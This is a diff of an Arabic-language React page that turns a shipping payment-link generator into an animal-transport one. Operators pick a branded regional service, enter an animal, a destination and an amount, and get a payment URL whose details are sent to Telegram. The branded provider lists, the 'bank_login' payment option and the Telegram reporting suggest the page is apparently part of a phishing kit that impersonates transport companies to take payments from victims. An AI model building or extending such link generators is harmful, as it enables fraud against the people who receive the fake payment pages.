@@ -5,21 +5,18 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Textarea } from "@/components/ui/textarea";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
-import { getServicesByCountry } from "@/lib/gccShippingServices";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getAnimalServicesByCountry } from "@/lib/animalTransportServices";
+import { getAnimalServiceBranding } from "@/lib/animalServiceLogos";
 import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
-import { getCompanyMeta } from "@/utils/companyMeta";
-import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
-import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard, User } from "lucide-react";
+import { PawPrint, MapPin, DollarSign, FileText, Building2, Copy, ExternalLink, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
-import TelegramTest from "@/components/TelegramTest";
 import {
   AlertDialog,
-  AlertDialogAction,
   AlertDialogContent,
   AlertDialogDescription,
   AlertDialogFooter,
@@ -27,40 +24,39 @@ import {
   AlertDialogTitle,
 } from "@/components/ui/alert-dialog";
 
-const CreateShippingLink = () => {
+const CreateAnimalLink = () => {
   const { country } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
   const createLink = useCreateLink();
   const countryData = getCountryByCode(country?.toUpperCase() || "");
-  const services = getServicesByCountry(country?.toUpperCase() || "");
+  const services = getAnimalServicesByCountry(country?.toUpperCase() || "");
   
   const [selectedService, setSelectedService] = useState("");
-  const [trackingNumber, setTrackingNumber] = useState("");
-  const [payerType, setPayerType] = useState("recipient"); // "recipient" or "sender"
-  const [packageDescription, setPackageDescription] = useState("");
-  const [codAmount, setCodAmount] = useState("500");
-  const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
+  const [animalType, setAnimalType] = useState(""); // نوع الحيوان
+  const [animalDetails, setAnimalDetails] = useState(""); // تفاصيل الحيوان
+  const [destination, setDestination] = useState(""); // الوجهة
+  const [transportAmount, setTransportAmount] = useState("500");
+  const [paymentMethod, setPaymentMethod] = useState("card");
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
   const [linkId, setLinkId] = useState("");
   const [copied, setCopied] = useState(false);
   
-  // Get selected service details and branding
   const selectedServiceData = useMemo(() => 
     services.find(s => s.key === selectedService),
     [services, selectedService]
   );
   
   const serviceBranding = useMemo(() =>
-    selectedService ? getServiceBranding(selectedService) : null,
+    selectedService ? getAnimalServiceBranding(selectedService) : null,
     [selectedService]
   );
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (!selectedService || !trackingNumber) {
+    if (!selectedService || !animalType || !destination) {
       toast({
         title: "خطأ",
         description: "الرجاء ملء جميع الحقول المطلوبة",
@@ -69,48 +65,45 @@ const CreateShippingLink = () => {
       return;
     }
 
-    
     try {
       const link = await createLink.mutateAsync({
-        type: "shipping",
+        type: "animal",
         country_code: country || "",
         payload: {
           service_key: selectedService,
           service_name: selectedServiceData?.name || selectedService,
-          tracking_number: trackingNumber,
-          payer_type: payerType, // "recipient" or "sender"
-          package_description: packageDescription,
-          cod_amount: parseFloat(codAmount) || 500,
+          animal_type: animalType,
+          animal_details: animalDetails,
+          destination: destination,
+          transport_amount: parseFloat(transportAmount) || 500,
           currency_code: getCurrencyCode(country || "SA"),
           payment_method: paymentMethod,
           selectedCountry: country || "SA",
         },
       });
 
-      // Generate unified payment URL using the new function
       const paymentUrl = generatePaymentLink({
         invoiceId: link.id,
         company: selectedService,
         country: country || 'SA'
       });
 
-      // Send data to Telegram with image and description
       const telegramResult = await sendToTelegram({
-        type: 'shipping_link_created',
+        type: 'animal_link_created',
         data: {
-          tracking_number: trackingNumber,
           service_name: selectedServiceData?.name || selectedService,
-          package_description: packageDescription,
-          cod_amount: parseFloat(codAmount) || 0,
+          animal_type: animalType,
+          animal_details: animalDetails,
+          destination: destination,
+          transport_amount: parseFloat(transportAmount) || 0,
           country: countryData.nameAr,
           payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
         },
         timestamp: new Date().toISOString(),
-        imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
+        imageUrl: serviceBranding?.ogImage,
         description: serviceBranding?.description || selectedServiceData?.description
       });
 
-      // حفظ الرابط وإظهار Dialog
       setCreatedPaymentUrl(paymentUrl);
       setLinkId(link.id);
       setShowSuccessDialog(true);
@@ -120,16 +113,14 @@ const CreateShippingLink = () => {
           title: "تم الإرسال بنجاح",
           description: "تم إرسال البيانات إلى التليجرام",
         });
-      } else {
-        console.error('Telegram error:', telegramResult.error);
-        toast({
-          title: "تحذير",
-          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
-          variant: "destructive",
-        });
       }
     } catch (error) {
       console.error("Error creating link:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء إنشاء الرابط",
+        variant: "destructive",
+      });
     }
   };
   
@@ -151,7 +142,7 @@ const CreateShippingLink = () => {
     return (
       <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
         <div className="text-center p-8">
-          <Package className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
+          <PawPrint className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
           <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
           <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
           <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
@@ -163,11 +154,6 @@ const CreateShippingLink = () => {
   return (
     <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
       <div className="container mx-auto px-4">
-        {/* Telegram Test Component */}
-        <div className="mb-6">
-          <TelegramTest />
-        </div>
-        
         <div className="max-w-2xl mx-auto">
           <Card className="p-4 shadow-elevated">
             <div
@@ -178,24 +164,27 @@ const CreateShippingLink = () => {
             >
               <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
               <div className="absolute bottom-2 right-4 text-white">
-                <h1 className="text-lg font-bold">إنشاء رابط دفع - شحن</h1>
+                <h1 className="text-lg font-bold">إنشاء رابط دفع - نقل حيوانات</h1>
                 <p className="text-xs opacity-90">{countryData.nameAr}</p>
               </div>
             </div>
             
             <form onSubmit={handleSubmit} className="space-y-4">
-              {/* Service Selection with Logo and Description */}
+              {/* Service Selection */}
               <div>
-                <Label className="mb-2 text-sm">خدمة الشحن *</Label>
+                <Label className="mb-2 text-sm">خدمة النقل *</Label>
                 <Select value={selectedService} onValueChange={setSelectedService}>
                   <SelectTrigger className="h-10">
-                    <SelectValue placeholder="اختر خدمة الشحن" />
+                    <SelectValue placeholder="اختر خدمة نقل الحيوانات" />
                   </SelectTrigger>
                   <SelectContent className="bg-background">
                     {services.length > 0 ? (
                       services.map((service) => (
                         <SelectItem key={service.id} value={service.key}>
-                          {service.name}
+                          <div className="flex flex-col">
+                            <span>{service.name}</span>
+                            <span className="text-xs text-muted-foreground">{service.animalTypes}</span>
+                          </div>
                         </SelectItem>
                       ))
                     ) : (
@@ -211,85 +200,65 @@ const CreateShippingLink = () => {
               {selectedService && serviceBranding && selectedServiceData && (
                 <div className="p-3 rounded-lg border border-border bg-card/50">
                   <div className="flex items-center gap-3 mb-2">
-                    {serviceBranding.logo && (
-                      <img
-                        src={serviceBranding.logo}
-                        alt={selectedServiceData.name}
-                        className="h-8 object-contain"
-                        onError={(e) => {
-                          e.currentTarget.style.display = 'none';
-                        }}
-                      />
-                    )}
+                    <PawPrint className="w-6 h-6" style={{ color: serviceBranding.colors.primary }} />
                     <div>
                       <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
+                      <p className="text-xs text-muted-foreground">{selectedServiceData.animalTypes}</p>
                     </div>
                   </div>
                   <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
                 </div>
               )}
               
-              {/* Tracking Number */}
+              {/* Animal Type */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <Hash className="w-3 h-3" />
-                  رقم الشحنة *
+                  <PawPrint className="w-3 h-3" />
+                  نوع الحيوان *
                 </Label>
                 <Input
-                  value={trackingNumber}
-                  onChange={(e) => setTrackingNumber(e.target.value)}
-                  placeholder="مثال: 1234567890"
+                  value={animalType}
+                  onChange={(e) => setAnimalType(e.target.value)}
+                  placeholder="مثال: كلب، قطة، حصان، أبقار"
                   className="h-9 text-sm"
                   required
                 />
               </div>
 
-              {/* Payer Type Selection */}
+              {/* Animal Details */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <User className="w-3 h-3" />
-                  من سيدفع رسوم الشحن؟ *
+                  <FileText className="w-3 h-3" />
+                  تفاصيل الحيوان
                 </Label>
-                <Select value={payerType} onValueChange={setPayerType}>
-                  <SelectTrigger className="h-10">
-                    <SelectValue placeholder="اختر من يدفع الرسوم" />
-                  </SelectTrigger>
-                  <SelectContent className="bg-background">
-                    <SelectItem value="recipient">
-                      <div className="flex items-center gap-2">
-                        <User className="w-4 h-4" />
-                        <span>المستلم - سيستلم الشحنة ويدفع</span>
-                      </div>
-                    </SelectItem>
-                    <SelectItem value="sender">
-                      <div className="flex items-center gap-2">
-                        <User className="w-4 h-4" />
-                        <span>المرسل - أرسل الشحنة ويدفع</span>
-                      </div>
-                    </SelectItem>
-                  </SelectContent>
-                </Select>
-              </div>
-              
-              {/* Package Description */}
-              <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <Package className="w-3 h-3" />
-                  وصف الطرد
-                </Label>
-                <Input
-                  value={packageDescription}
-                  onChange={(e) => setPackageDescription(e.target.value)}
-                  placeholder="مثال: ملابس، إلكترونيات"
-                  className="h-9 text-sm"
+                <Textarea
+                  value={animalDetails}
+                  onChange={(e) => setAnimalDetails(e.target.value)}
+                  placeholder="السلالة، العمر، الوزن، الحالة الصحية، أي تفاصيل إضافية"
+                  className="min-h-[80px] text-sm"
                 />
               </div>
               
-              {/* COD Amount */}
+              {/* Destination */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <MapPin className="w-3 h-3" />
+                  الوجهة *
+                </Label>
+                <Input
+                  value={destination}
+                  onChange={(e) => setDestination(e.target.value)}
+                  placeholder="مثال: دبي، الرياض، لندن"
+                  className="h-9 text-sm"
+                  required
+                />
+              </div>
+              
+              {/* Transport Amount */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
                   <DollarSign className="w-3 h-3" />
-                  مبلغ الدفع عند الاستلام
+                  تكلفة النقل
                   {country && (
                     <span className="text-xs text-muted-foreground">
                       ({getCurrencyName(country)})
@@ -298,8 +267,8 @@ const CreateShippingLink = () => {
                 </Label>
                 <Input
                   type="number"
-                  value={codAmount}
-                  onChange={(e) => setCodAmount(e.target.value)}
+                  value={transportAmount}
+                  onChange={(e) => setTransportAmount(e.target.value)}
                   placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                   className="h-9 text-sm"
                   step="0.01"
@@ -354,7 +323,7 @@ const CreateShippingLink = () => {
                   <span className="text-sm">جاري الإنشاء...</span>
                 ) : (
                   <>
-                    <Package className="w-4 h-4 ml-2" />
+                    <PawPrint className="w-4 h-4 ml-2" />
                     <span className="text-sm">إنشاء رابط الدفع</span>
                   </>
                 )}
@@ -364,7 +333,7 @@ const CreateShippingLink = () => {
         </div>
       </div>
       
-      {/* Success Dialog with Copy and Preview buttons */}
+      {/* Success Dialog */}
       <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
         <AlertDialogContent className="max-w-md" dir="rtl">
           <AlertDialogHeader>
@@ -384,18 +353,18 @@ const CreateShippingLink = () => {
                 <span className="font-semibold">{selectedServiceData?.name || selectedService}</span>
               </div>
               <div className="flex items-center justify-between text-sm">
-                <span className="text-muted-foreground">رقم الشحنة:</span>
-                <span className="font-semibold">{trackingNumber}</span>
+                <span className="text-muted-foreground">نوع الحيوان:</span>
+                <span className="font-semibold">{animalType}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">الوجهة:</span>
+                <span className="font-semibold">{destination}</span>
               </div>
               <div className="flex items-center justify-between text-sm">
                 <span className="text-muted-foreground">المبلغ:</span>
                 <span className="font-semibold">
-                  {formatCurrency(parseFloat(codAmount) || 500, country || "SA")}
+                  {formatCurrency(parseFloat(transportAmount) || 500, country || "SA")}
                 </span>
-              </div>
-              <div className="flex items-center justify-between text-sm">
-                <span className="text-muted-foreground">العملة:</span>
-                <span className="font-semibold">{getCurrencyName(country || "SA")}</span>
               </div>
               <div className="flex items-center justify-between text-sm">
                 <span className="text-muted-foreground">طريقة الدفع:</span>
@@ -445,4 +414,4 @@ const CreateShippingLink = () => {
   );
 };
 
-export default CreateShippingLink;
+export default CreateAnimalLink;
